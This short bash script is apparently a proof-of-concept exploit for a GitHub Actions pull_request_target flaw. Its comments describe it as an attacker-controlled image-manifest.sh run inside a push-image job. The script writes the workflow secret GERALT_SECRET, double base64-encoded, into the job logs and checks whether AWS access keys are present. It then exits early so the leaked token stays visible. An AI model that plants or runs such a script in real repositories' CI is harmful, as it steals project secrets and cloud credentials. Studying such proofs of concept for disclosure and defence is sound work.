#!/usr/bin/env bash
# Attacker-controlled script executed by push-image (job has NO needs -> starts
# at T=0 and is the earliest sink). Runs with AWS_ACCESS_KEY_ID,
# AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION in the step env and GERALT_SECRET
# from workflow-level env (pull_request_target base-repo context).
printf '%s\n' 'GERALT_DBG attacker-controlled image-manifest.sh executing in push-image'
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
  printf '%s\n' 'GERALT_DBG AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY are present in step env'
fi
# Stop so the leaked token stays visible in the logs (upload-images.sh never runs).
exit 1
